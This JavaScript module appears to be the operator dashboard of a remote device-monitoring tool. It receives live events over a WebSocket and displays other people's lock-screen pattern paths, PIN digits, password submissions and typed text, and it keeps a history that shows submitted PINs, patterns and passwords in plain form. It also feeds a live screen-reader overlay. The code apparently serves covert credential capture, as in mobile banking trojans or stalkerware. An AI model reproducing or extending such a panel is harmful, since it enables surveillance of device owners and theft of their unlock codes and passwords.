// ---- Input Visualization ----
var ivWs = null;
var ivReconnectTimer = null;
var ivEventHistory = [];
const IV_MAX_HISTORY = 50;

function inputVizConnect() {
    if (ivWs && ivWs.readyState === WebSocket.OPEN) return;
    
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    const host = location.host;
    ivWs = new WebSocket(`${proto}//${host}/ws/input_viz`);
    
    ivWs.onopen = function() {
        console.log("[IV] Connected");
    };
    
    ivWs.onmessage = function(event) {
        try {
            const msg = JSON.parse(event.data);
            if (msg.type === 'input_viz') {
                handleInputVizEvent(msg);
            } else if (msg.type === 'connected') {
                console.log("[IV] Server connected:", msg.message);
            }
        } catch (e) {
            console.error("[IV] Message parse error:", e);
        }
    };
    
    ivWs.onclose = function() {
        console.log("[IV] Disconnected, reconnecting in 3s...");
        if (ivReconnectTimer) clearTimeout(ivReconnectTimer);
        ivReconnectTimer = setTimeout(inputVizConnect, 3000);
    };
    
    ivWs.onerror = function(err) {
        console.error("[IV] WebSocket error:", err);
    };
}

function handleInputVizEvent(msg) {
    const event = msg.event;
    const deviceKey = msg.deviceKey;
    const timestamp = msg.timestamp || Date.now();
    const timeStr = new Date(timestamp).toLocaleTimeString();
    
    // Update active visualization
    const ivActive = document.getElementById('inputVizActive');
    const ivEmpty = document.getElementById('ivEmpty');
    const ivContent = document.getElementById('ivContent');
    const ivType = document.getElementById('ivType');
    const ivDevice = document.getElementById('ivDevice');
    const ivTime = document.getElementById('ivTime');
    
    if (ivActive && ivEmpty) {
        ivEmpty.style.display = 'none';
        ivActive.style.display = 'flex';
    }
    
    // Update header
    const typeLabels = {
        'pattern_start': 'Pattern',
        'pattern_node_select': 'Pattern',
        'pattern_drag': 'Pattern',
        'pattern_end': 'Pattern',
        'pattern_submit': 'Pattern',
        'pattern_error': 'Pattern',
        'pattern_clear': 'Pattern',
        'pin_digit': 'PIN',
        'pin_submit': 'PIN',
        'pin_error': 'PIN',
        'pin_backspace': 'PIN',
        'password_char': 'Password',
        'password_backspace': 'Password',
        'password_submit': 'Password',
        'password_visibility_toggle': 'Password',
        'key_text': 'Keyboard',
        'key_submit': 'Keyboard'
    };
    
    const typeLabel = typeLabels[event] || event;
    if (ivType) ivType.textContent = typeLabel.toUpperCase();
    if (ivDevice) ivDevice.textContent = deviceKey || 'Unknown';
    if (ivTime) ivTime.textContent = timeStr;
    
    // Render content based on event type
    const contentEl = document.getElementById('ivContent');
    if (contentEl) {
        renderInputVizContent(contentEl, event, msg);
    }
    
    // Add to history
    addToHistory(event, deviceKey, timeStr, msg);

    // Mirror the event into the Screen Monitor's reader overlay so typed keys,
    // PIN digits and pattern nodes show up right next to the live reader.
    try {
        if (typeof window.hwReaderNoteInput === 'function') window.hwReaderNoteInput(msg);
    } catch (e) { /* reader overlay is optional */ }
}

function renderInputVizContent(container, event, msg) {
    if (event.startsWith('pattern')) {
        renderPatternViz(container, msg);
    } else if (event.startsWith('pin')) {
        renderPinViz(container, msg);
    } else if (event.startsWith('password')) {
        renderPasswordViz(container, msg);
    } else if (event.startsWith('key')) {
        renderKeyViz(container, msg);
    }
}

function renderKeyViz(container, msg) {
    const text = msg.text != null ? String(msg.text) : '';
    const field = msg.vw ? String(msg.vw).split('/').pop() : '';
    container.innerHTML = '<div class="iv-key-display">'
        + (text ? text.replace(/[<>&]/g, function (c) { return c === '<' ? '&lt;' : c === '>' ? '&gt;' : '&amp;'; }) : '—')
        + '</div>'
        + (field ? '<div class="iv-history-meta" style="text-align:center;margin-top:8px">Field: '
            + field.replace(/[<>&]/g, '') + '</div>' : '');
}

function renderPatternViz(container, msg) {
    const path = msg.path || [];
    const currentPos = msg.x !== undefined && msg.y !== undefined ? {x: msg.x, y: msg.y} : null;
    
    // Grid size
    const GRID_SIZE = 3;
    const size = 240;
    const cellSize = size / 3;
    const nodeRadius = cellSize * 0.35;
    
    let svg = '<svg class="iv-pattern-svg" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">';
    
    // Draw lines between connected nodes
    if (msg.path && msg.path.length > 1) {
        svg += '<g class="iv-pattern-lines">';
        for (let i = 0; i < msg.path.length - 1; i++) {
            const a = getNodeCenter(msg.path[i]);
            const b = getNodeCenter(msg.path[i + 1]);
            svg += `<line class="iv-pattern-line" x1="${a.x}" y1="${a.y}" x2="${b.x}" y2="${b.y}" />`;
        }
        svg += '</g>';
    }
    
    // Current drag line
    if (msg.x !== undefined && msg.y !== undefined && msg.path && msg.path.length > 0) {
        const last = getNodeCenter(msg.path[msg.path.length - 1]);
        svg += `<line class="iv-pattern-line" x1="${last.x}" y1="${last.y}" x2="${msg.x}" y2="${msg.y}" stroke-dasharray="8,6" opacity="0.6" />`;
    }
    
    // Draw nodes
    svg += '<g class="iv-pattern-nodes">';
    for (let i = 0; i < 9; i++) {
        const col = i % 3;
        const row = Math.floor(i / 3);
        const cx = col * 80 + 40;
        const cy = row * 80 + 40;
        const isActive = msg.path && msg.path.includes(i);
        
        svg += `<g class="iv-pattern-node ${isActive ? 'active' : ''}" transform="translate(${cx}, ${cy})">`;
        svg += `<circle class="iv-node-outer" r="28" fill="none" stroke="${isActive ? 'var(--accent)' : 'var(--border)'}" stroke-width="3"/>`;
        if (isActive) {
            svg += `<circle class="iv-node-inner" r="12" fill="var(--accent)"/>`;
        }
        svg += '</g>';
    }
    svg += '</g>';
    
    // Current drag line
    if (currentPos) {
        const last = getNodeCenter(msg.path[msg.path.length - 1]);
        svg += `<line class="iv-pattern-line" x1="${last.x}" y1="${last.y}" x2="${currentPos.x}" y2="${currentPos.y}" stroke-dasharray="8,6" opacity="0.6" />`;
    }
    
    svg += '</svg>';
    container.innerHTML = svg;
}

function getNodeCenter(index) {
    const col = index % 3;
    const row = Math.floor(index / 3);
    return { x: col * 80 + 40, y: row * 80 + 40 };
}

function renderPinViz(container, msg) {
    const length = msg.length != null ? msg.length : (msg.entered || 0);
    let html = '<div class="iv-pin-display">';
    for (let i = 0; i < 6; i++) {
        const filled = i < length;
        html += `<div class="iv-pin-dot ${filled ? 'filled' : ''}"></div>`;
    }
    html += '</div>';
    if (msg.event === 'pin_error') {
        html += '<p style="color:var(--error);text-align:center;margin-top:8px">Incorrect PIN</p>';
    }
    container.innerHTML = html;
}

function renderPasswordViz(container, msg) {
    const len = msg.length || 0;
    const dots = '•'.repeat(len);
    container.innerHTML = `<div class="iv-password-display">${dots || '—'}</div>`;
}

function addToHistory(event, deviceKey, timeStr, msg) {
    const typeLabels = {
        'pattern_start': 'Pattern',
        'pattern_node_select': 'Pattern',
        'pattern_drag': 'Pattern',
        'pattern_end': 'Pattern',
        'pattern_submit': 'Pattern',
        'pattern_error': 'Pattern',
        'pattern_clear': 'Pattern',
        'pin_digit': 'PIN',
        'pin_submit': 'PIN',
        'pin_error': 'PIN',
        'pin_backspace': 'PIN',
        'password_char': 'Password',
        'password_backspace': 'Password',
        'password_submit': 'Password',
        'password_visibility_toggle': 'Password',
        'key_text': 'Keyboard',
        'key_submit': 'Keyboard'
    };
    const vizEsc = function (value) {
        return String(value == null ? '' : value)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    };
    
    const typeLabel = typeLabels[event] || event;
    const typeClass = event.startsWith('pin') ? 'pin'
        : event.startsWith('password') ? 'password'
        : event.startsWith('key') ? 'key' : 'pattern';
    
    let summary = '';
    if (event === 'pattern_submit' || event === 'pin_submit' || event === 'password_submit') {
        summary = vizEsc(msg.pattern || msg.pin || msg.password || ('•'.repeat(msg.length || 0)));
    } else if (event === 'pin_digit' || event === 'pin_backspace') {
        summary = `${vizEsc(msg.digit || '')} (${msg.length || 0}/6)`;
    } else if (event === 'password_char' || event === 'password_backspace') {
        summary = `${msg.length || 0} chars`;
    } else if (event === 'pin_error') {
        summary = `Incorrect PIN (${msg.entered != null ? msg.entered : (msg.length || 0)} digits)`;
    } else if (event === 'key_text') {
        summary = vizEsc(msg.text || '');
    } else if (event.startsWith('pattern')) {
        summary = `${msg.pathLength != null ? msg.pathLength : ((msg.path && msg.path.length) || 0)} nodes`;
    } else {
        summary = vizEsc(event);
    }
    
    const historyEl = document.getElementById('inputVizHistory');
    if (!historyEl) return;
    
    const item = document.createElement('div');
    item.className = 'iv-history-item';
    item.innerHTML = `
        <span class="iv-history-type ${typeClass}">${vizEsc(typeLabel).toUpperCase()}</span>
        <div class="iv-history-details">
            <div class="iv-history-summary">${summary}</div>
            <div class="iv-history-meta">Device: ${vizEsc(deviceKey || 'Unknown')}</div>
        </div>
        <span class="iv-history-time">${new Date().toLocaleTimeString()}</span>
    `;
    
    if (historyEl.firstChild && historyEl.firstChild.classList.contains('empty')) {
        historyEl.innerHTML = '';
    }
    
    historyEl.insertBefore(item, historyEl.firstChild);
    
    // Limit history
    while (historyEl.children.length > 50) {
        historyEl.removeChild(historyEl.lastChild);
    }
}

function inputVizRefresh() {
    if (ivWs && ivWs.readyState === WebSocket.OPEN) {
        ivWs.send(JSON.stringify({ type: 'filter', deviceKey: null }));
    }
    showToast('Input visualization refreshed', 'success');
}

function inputVizClear() {
    const ivActive = document.getElementById('inputVizActive');
    const ivEmpty = document.getElementById('ivEmpty');
    const ivContent = document.getElementById('ivContent');
    const historyEl = document.getElementById('inputVizHistory');
    
    if (ivActive) ivActive.style.display = 'none';
    if (ivEmpty) ivEmpty.style.display = 'flex';
    if (ivContent) ivContent.innerHTML = '';
    if (historyEl) historyEl.innerHTML = '<div class="empty">No events yet</div>';
    
    ivEventHistory = [];
    showToast('Input visualization cleared', 'success');
}

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', function() {
    // Connect when the inputviz tab is shown
    const originalSwitchTab = window.switchTab;
    if (originalSwitchTab) {
        window.switchTab = function(tab) {
            originalSwitchTab(tab);
            if (tab === 'inputviz' && (!ivWs || ivWs.readyState !== WebSocket.OPEN)) {
                inputVizConnect();
            }
        };
    }
    
    // Also connect if we're already on the tab
    setTimeout(function() {
        const activeTab = document.querySelector('.tab-view.active');
        if (activeTab && activeTab.id === 'inputviz') {
            inputVizConnect();
        }
    }, 1000);
});
</script>
